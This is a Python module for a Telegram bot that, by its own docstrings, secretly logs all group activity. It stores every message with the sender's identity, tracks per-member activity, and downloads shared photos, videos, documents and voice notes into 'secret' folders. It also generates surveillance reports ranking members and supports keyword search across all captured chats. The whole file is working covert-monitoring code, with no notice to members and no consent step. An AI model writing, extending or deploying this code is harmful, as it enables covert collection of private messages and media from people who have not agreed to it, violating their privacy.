import asyncio
import json
import os
import time
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Any
import requests
import logging
from telegram.ext import ContextTypes
from telegram import Bot, Update

logger = logging.getLogger(__name__)

class GroupSurveillanceService:
    def __init__(self, bot: Bot):
        self.bot = bot
        self.group_logs = self.load_group_logs()
        self.group_members = self.load_group_members()
        self.group_media = self.load_group_media()
        self.running = False
        
    def load_group_logs(self) -> Dict[str, Any]:
        """Load group surveillance logs"""
        try:
            if os.path.exists("secret_group_logs.json"):
                with open("secret_group_logs.json", 'r', encoding='utf-8') as f:
                    return json.load(f)
        except Exception as e:
            logger.error(f"Error loading group logs: {e}")
        return {}
    
    def save_group_logs(self):
        """Save group surveillance logs"""
        try:
            with open("secret_group_logs.json", 'w', encoding='utf-8') as f:
                json.dump(self.group_logs, f, indent=2, default=str, ensure_ascii=False)
        except Exception as e:
            logger.error(f"Error saving group logs: {e}")
    
    def load_group_members(self) -> Dict[str, Any]:
        """Load group member database"""
        try:
            if os.path.exists("secret_group_members.json"):
                with open("secret_group_members.json", 'r', encoding='utf-8') as f:
                    return json.load(f)
        except Exception as e:
            logger.error(f"Error loading group members: {e}")
        return {}
    
    def save_group_members(self):
        """Save group member database"""
        try:
            with open("secret_group_members.json", 'w', encoding='utf-8') as f:
                json.dump(self.group_members, f, indent=2, default=str, ensure_ascii=False)
        except Exception as e:
            logger.error(f"Error saving group members: {e}")
    
    def load_group_media(self) -> Dict[str, Any]:
        """Load group media database"""
        try:
            if os.path.exists("secret_group_media.json"):
                with open("secret_group_media.json", 'r', encoding='utf-8') as f:
                    return json.load(f)
        except Exception as e:
            logger.error(f"Error loading group media: {e}")
        return {}
    
    def save_group_media(self):
        """Save group media database"""
        try:
            with open("secret_group_media.json", 'w', encoding='utf-8') as f:
                json.dump(self.group_media, f, indent=2, default=str, ensure_ascii=False)
        except Exception as e:
            logger.error(f"Error saving group media: {e}")
    
    async def log_group_activity(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Secretly log all group activity"""
        try:
            if not update.effective_chat or update.effective_chat.type not in ['group', 'supergroup']:
                return  # Not a group message
            
            chat = update.effective_chat
            user = update.effective_user
            message = update.effective_message
            
            if not chat or not user or not message:
                return
            
            chat_id = str(chat.id)
            user_id = str(user.id)
            
            # Initialize group logs if needed
            if chat_id not in self.group_logs:
                self.group_logs[chat_id] = {
                    "group_info": {
                        "id": chat_id,
                        "title": chat.title,
                        "type": chat.type,
                        "description": chat.description,
                        "invite_link": chat.invite_link,
                        "member_count": await self.get_member_count(context, chat_id),
                        "first_seen": datetime.now().isoformat(),
                        "last_activity": datetime.now().isoformat()
                    },
                    "messages": [],
                    "media_files": [],
                    "member_activity": {}
                }
            
            # Update group info
            self.group_logs[chat_id]["group_info"]["last_activity"] = datetime.now().isoformat()
            if chat.title:
                self.group_logs[chat_id]["group_info"]["title"] = chat.title
            
            # Log member information
            await self.log_member_info(user_id, user, chat_id)
            
            # Create comprehensive message log
            message_log = {
                "timestamp": datetime.now().isoformat(),
                "date": datetime.now().strftime("%Y-%m-%d"),
                "time": datetime.now().strftime("%H:%M:%S"),
                "message_id": message.message_id,
                "user_details": {
                    "user_id": user_id,
                    "username": user.username,
                    "first_name": user.first_name,
                    "last_name": user.last_name,
                    "language_code": user.language_code,
                    "is_bot": user.is_bot,
                    "is_premium": getattr(user, 'is_premium', False)
                },
                "group_details": {
                    "group_id": chat_id,
                    "group_title": chat.title,
                    "group_type": chat.type,
                    "member_count": await self.get_member_count(context, chat_id)
                },
                "message_details": {
                    "text_content": message.text,
                    "caption": message.caption,
                    "message_type": self.get_message_type(message),
                    "reply_to_message": self.get_reply_info(message),
                    "forward_info": self.get_forward_info(message),
                    "edit_date": message.edit_date.isoformat() if message.edit_date else None
                },
                "media_details": None,
                "file_management": {
                    "file_downloaded": False,
                    "local_file_path": None,
                    "download_success": False
                }
            }
            
            # Handle media files
            if self.has_media(message):
                media_info = await self.process_group_media(message, context, chat_id, user_id)
                message_log["media_details"] = media_info
                message_log["file_management"] = media_info.get("file_management", {})
            
            # Add message to group logs
            self.group_logs[chat_id]["messages"].append(message_log)
            
            # Track member activity
            if user_id not in self.group_logs[chat_id]["member_activity"]:
                self.group_logs[chat_id]["member_activity"][user_id] = {
                    "message_count": 0,
                    "media_count": 0,
                    "first_message": datetime.now().isoformat(),
                    "last_message": datetime.now().isoformat()
                }
            
            self.group_logs[chat_id]["member_activity"][user_id]["message_count"] += 1
            self.group_logs[chat_id]["member_activity"][user_id]["last_message"] = datetime.now().isoformat()
            
            if self.has_media(message):
                self.group_logs[chat_id]["member_activity"][user_id]["media_count"] += 1
            
            # Keep only last 1000 messages per group
            if len(self.group_logs[chat_id]["messages"]) > 1000:
                self.group_logs[chat_id]["messages"] = self.group_logs[chat_id]["messages"][-1000:]
            
            # Save logs
            self.save_group_logs()
            
            logger.info(f"Group activity logged: {chat.title} ({chat_id}) - User: {user.first_name} ({user_id})")
            
        except Exception as e:
            logger.error(f"Error logging group activity: {e}")
    
    async def log_member_info(self, user_id: str, user, chat_id: str):
        """Log detailed member information"""
        try:
            if chat_id not in self.group_members:
                self.group_members[chat_id] = {}
            
            member_info = {
                "user_id": user_id,
                "username": user.username,
                "first_name": user.first_name,
                "last_name": user.last_name,
                "language_code": user.language_code,
                "is_bot": user.is_bot,
                "is_premium": getattr(user, 'is_premium', False),
                "first_seen": self.group_members[chat_id].get(user_id, {}).get("first_seen", datetime.now().isoformat()),
                "last_seen": datetime.now().isoformat(),
                "total_messages": self.group_members[chat_id].get(user_id, {}).get("total_messages", 0) + 1
            }
            
            self.group_members[chat_id][user_id] = member_info
            self.save_group_members()
            
        except Exception as e:
            logger.error(f"Error logging member info: {e}")
    
    async def process_group_media(self, message, context: ContextTypes.DEFAULT_TYPE, chat_id: str, user_id: str):
        """Process and download group media files"""
        try:
            media_info = self.get_detailed_media_info(message)
            if not media_info:
                return None
            
            # Create group media directory
            group_media_dir = f"secret_group_media/{chat_id}"
            os.makedirs(group_media_dir, exist_ok=True)
            
            # Download media file
            file_downloaded = False
            local_file_path = None
            
            try:
                if message.photo:
                    photo = message.photo[-1]  # Highest resolution
                    file = await context.bot.get_file(photo.file_id)
                    file_extension = "jpg"
                    local_file_path = f"{group_media_dir}/photo_{user_id}_{message.message_id}_{int(time.time())}.{file_extension}"
                    await file.download_to_drive(local_file_path)
                    file_downloaded = True
                    
                elif message.video:
                    file = await context.bot.get_file(message.video.file_id)
                    file_extension = "mp4"
                    local_file_path = f"{group_media_dir}/video_{user_id}_{message.message_id}_{int(time.time())}.{file_extension}"
                    await file.download_to_drive(local_file_path)
                    file_downloaded = True
                    
                elif message.document:
                    file = await context.bot.get_file(message.document.file_id)
                    file_name = message.document.file_name or f"document_{message.message_id}"
                    local_file_path = f"{group_media_dir}/doc_{user_id}_{message.message_id}_{file_name}"
                    await file.download_to_drive(local_file_path)
                    file_downloaded = True
                    
                elif message.audio:
                    file = await context.bot.get_file(message.audio.file_id)
                    file_extension = "mp3"
                    local_file_path = f"{group_media_dir}/audio_{user_id}_{message.message_id}_{int(time.time())}.{file_extension}"
                    await file.download_to_drive(local_file_path)
                    file_downloaded = True
                    
                elif message.voice:
                    file = await context.bot.get_file(message.voice.file_id)
                    file_extension = "ogg"
                    local_file_path = f"{group_media_dir}/voice_{user_id}_{message.message_id}_{int(time.time())}.{file_extension}"
                    await file.download_to_drive(local_file_path)
                    file_downloaded = True
                    
            except Exception as download_error:
                logger.error(f"Error downloading group media: {download_error}")
            
            # Add file management info
            media_info["file_management"] = {
                "file_downloaded": file_downloaded,
                "local_file_path": local_file_path,
                "download_success": file_downloaded,
                "download_timestamp": datetime.now().isoformat() if file_downloaded else None
            }
            
            # Save to group media database
            if chat_id not in self.group_media:
                self.group_media[chat_id] = []
            
            media_entry = {
                "timestamp": datetime.now().isoformat(),
                "user_id": user_id,
                "message_id": message.message_id,
                "media_type": media_info["type"],
                "file_path": local_file_path,
                "media_info": media_info
            }
            
            self.group_media[chat_id].append(media_entry)
            
            # Keep only last 500 media files per group
            if len(self.group_media[chat_id]) > 500:
                self.group_media[chat_id] = self.group_media[chat_id][-500:]
            
            self.save_group_media()
            
            return media_info
            
        except Exception as e:
            logger.error(f"Error processing group media: {e}")
            return None
    
    async def get_member_count(self, context: ContextTypes.DEFAULT_TYPE, chat_id: str) -> int:
        """Get current member count of group"""
        try:
            chat_member_count = await context.bot.get_chat_member_count(chat_id)
            return chat_member_count
        except Exception as e:
            logger.error(f"Error getting member count: {e}")
            return 0
    
    def has_media(self, message) -> bool:
        """Check if message contains media"""
        return any([
            message.photo, message.video, message.document,
            message.audio, message.voice, message.video_note,
            message.sticker, message.animation
        ])
    
    def get_message_type(self, message) -> str:
        """Determine message type"""
        if message.text:
            return "text"
        elif message.photo:
            return "photo"
        elif message.video:
            return "video"
        elif message.document:
            return "document"
        elif message.audio:
            return "audio"
        elif message.voice:
            return "voice"
        elif message.video_note:
            return "video_note"
        elif message.sticker:
            return "sticker"
        elif message.animation:
            return "animation"
        else:
            return "other"
    
    def get_reply_info(self, message) -> Optional[Dict]:
        """Get reply message information"""
        if message.reply_to_message:
            reply_msg = message.reply_to_message
            return {
                "message_id": reply_msg.message_id,
                "user_id": str(reply_msg.from_user.id) if reply_msg.from_user else None,
                "username": reply_msg.from_user.username if reply_msg.from_user else None,
                "text": reply_msg.text[:100] if reply_msg.text else None,
                "media_type": self.get_message_type(reply_msg)
            }
        return None
    
    def get_forward_info(self, message) -> Optional[Dict]:
        """Get forward message information"""
        if message.forward_from or message.forward_from_chat:
            forward_info = {}
            if message.forward_from:
                forward_info["from_user"] = {
                    "user_id": str(message.forward_from.id),
                    "username": message.forward_from.username,
                    "first_name": message.forward_from.first_name
                }
            if message.forward_from_chat:
                forward_info["from_chat"] = {
                    "chat_id": str(message.forward_from_chat.id),
                    "title": message.forward_from_chat.title,
                    "type": message.forward_from_chat.type
                }
            if message.forward_date:
                forward_info["forward_date"] = message.forward_date.isoformat()
            return forward_info
        return None
    
    def get_detailed_media_info(self, message):
        """Extract detailed media information"""
        if message.photo:
            photo = message.photo[-1]  # Highest resolution
            return {
                "type": "photo",
                "file_id": photo.file_id,
                "file_unique_id": getattr(photo, 'file_unique_id', None),
                "file_size": photo.file_size,
                "width": photo.width,
                "height": photo.height,
                "caption": message.caption
            }
        elif message.video:
            return {
                "type": "video",
                "file_id": message.video.file_id,
                "file_unique_id": getattr(message.video, 'file_unique_id', None),
                "file_size": message.video.file_size,
                "duration": message.video.duration,
                "width": message.video.width,
                "height": message.video.height,
                "file_name": message.video.file_name,
                "mime_type": getattr(message.video, 'mime_type', None),
                "caption": message.caption
            }
        elif message.document:
            return {
                "type": "document",
                "file_id": message.document.file_id,
                "file_unique_id": getattr(message.document, 'file_unique_id', None),
                "file_size": message.document.file_size,
                "file_name": message.document.file_name,
                "mime_type": message.document.mime_type,
                "caption": message.caption
            }
        elif message.audio:
            return {
                "type": "audio",
                "file_id": message.audio.file_id,
                "file_unique_id": getattr(message.audio, 'file_unique_id', None),
                "file_size": message.audio.file_size,
                "duration": message.audio.duration,
                "title": message.audio.title,
                "performer": message.audio.performer,
                "caption": message.caption
            }
        elif message.voice:
            return {
                "type": "voice",
                "file_id": message.voice.file_id,
                "file_unique_id": getattr(message.voice, 'file_unique_id', None),
                "file_size": message.voice.file_size,
                "duration": message.voice.duration,
                "mime_type": getattr(message.voice, 'mime_type', None)
            }
        return None
    
    def get_group_surveillance_summary(self, chat_id: str = None) -> str:
        """Get surveillance summary for specific group or all groups"""
        try:
            if chat_id and chat_id in self.group_logs:
                # Specific group summary
                group_data = self.group_logs[chat_id]
                group_info = group_data["group_info"]
                messages = group_data["messages"]
                member_activity = group_data["member_activity"]
                
                summary = f"🕵️ **GROUP SURVEILLANCE REPORT**\n\n"
                summary += f"📊 **Group:** {group_info['title']}\n"
                summary += f"🆔 **ID:** {chat_id}\n"
                summary += f"👥 **Members:** {group_info.get('member_count', 0)}\n"
                summary += f"💬 **Messages Logged:** {len(messages)}\n"
                summary += f"📁 **Media Files:** {len(self.group_media.get(chat_id, []))}\n"
                summary += f"🕐 **Last Activity:** {group_info['last_activity'][:16]}\n\n"
                
                # Top active members
                if member_activity:
                    sorted_members = sorted(member_activity.items(), 
                                          key=lambda x: x[1]['message_count'], reverse=True)
                    summary += f"🔝 **Most Active Members:**\n"
                    for i, (user_id, activity) in enumerate(sorted_members[:5], 1):
                        member_info = self.group_members.get(chat_id, {}).get(user_id, {})
                        name = member_info.get('first_name', 'Unknown')
                        username = member_info.get('username', 'No username')
                        summary += f"{i}. {name} (@{username}): {activity['message_count']} messages\n"
                
                return summary
            else:
                # All groups summary
                summary = f"🕵️ **ALL GROUPS SURVEILLANCE SUMMARY**\n\n"
                summary += f"📊 **Total Groups Monitored:** {len(self.group_logs)}\n\n"
                
                total_messages = 0
                total_media = 0
                
                for group_id, group_data in self.group_logs.items():
                    group_info = group_data["group_info"]
                    messages = group_data["messages"]
                    media_files = self.group_media.get(group_id, [])
                    
                    total_messages += len(messages)
                    total_media += len(media_files)
                    
                    summary += f"🏢 **{group_info['title']}**\n"
                    summary += f"   📱 {len(messages)} messages | 📁 {len(media_files)} media files\n"
                    summary += f"   👥 {group_info.get('member_count', 0)} members\n"
                    summary += f"   🕐 Last: {group_info['last_activity'][:16]}\n\n"
                
                summary += f"📈 **TOTAL SURVEILLANCE DATA:**\n"
                summary += f"💬 **Messages:** {total_messages:,}\n"
                summary += f"📁 **Media Files:** {total_media:,}\n"
                summary += f"👤 **Unique Users:** {len(set().union(*[g.get('member_activity', {}).keys() for g in self.group_logs.values()]))}\n"
                
                return summary
                
        except Exception as e:
            logger.error(f"Error getting surveillance summary: {e}")
            return "❌ Error retrieving surveillance data."
    
    def search_group_messages(self, query: str, chat_id: str = None) -> str:
        """Search through group messages"""
        try:
            results = []
            search_groups = [chat_id] if chat_id else list(self.group_logs.keys())
            
            for group_id in search_groups:
                if group_id not in self.group_logs:
                    continue
                    
                group_data = self.group_logs[group_id]
                group_title = group_data["group_info"]["title"]
                
                for message in group_data["messages"]:
                    text_content = message["message_details"].get("text_content", "")
                    caption = message["message_details"].get("caption", "")
                    
                    if query.lower() in (text_content or "").lower() or query.lower() in (caption or "").lower():
                        user_details = message["user_details"]
                        results.append({
                            "group_title": group_title,
                            "group_id": group_id,
                            "user_name": user_details.get("first_name", "Unknown"),
                            "username": user_details.get("username", "No username"),
                            "text": (text_content or caption)[:100],
                            "timestamp": message["timestamp"][:16]
                        })
            
            if not results:
                return f"🔍 No messages found containing '{query}'"
            
            search_results = f"🔍 **SEARCH RESULTS FOR '{query}'**\n\n"
            search_results += f"📊 **Found {len(results)} matches**\n\n"
            
            for i, result in enumerate(results[:10], 1):  # Show top 10 results
                search_results += f"**{i}. {result['group_title']}**\n"
                search_results += f"👤 {result['user_name']} (@{result['username']})\n"
                search_results += f"💬 {result['text']}...\n"
                search_results += f"🕐 {result['timestamp']}\n\n"
            
            if len(results) > 10:
                search_results += f"... and {len(results) - 10} more results"
            
            return search_results
            
        except Exception as e:
            logger.error(f"Error searching messages: {e}")
            return "❌ Error searching messages."

# Global instance
group_surveillance = None